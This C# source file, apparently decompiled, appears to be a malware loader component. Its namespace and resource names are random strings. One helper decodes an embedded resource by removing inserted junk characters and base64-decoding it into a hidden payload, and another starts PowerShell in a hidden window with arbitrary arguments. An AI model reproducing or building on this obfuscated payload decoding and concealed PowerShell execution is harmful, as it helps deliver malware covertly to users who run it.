using System;
using System.Diagnostics;
using System.Text;
using Olklwtdpqcgelweitxp.Properties;

namespace Olklwtdpqcgelweitxp;

internal static class Helper
{
	public static byte[] BytesConvertor
	{
		get
		{
			byte[] fwpjgdyevlwcpqmfxyodhayb = Resources.Fwpjgdyevlwcpqmfxyodhayb;
			return Convert.FromBase64String(Encoding.UTF8.GetString(fwpjgdyevlwcpqmfxyodhayb).Replace("早谢5", null));
		}
	}

	public static Process Processor(string s)
	{
		return Process.Start(new ProcessStartInfo
		{
			FileName = "powershell",
			Arguments = s,
			WindowStyle = ProcessWindowStyle.Hidden
		});
	}
}
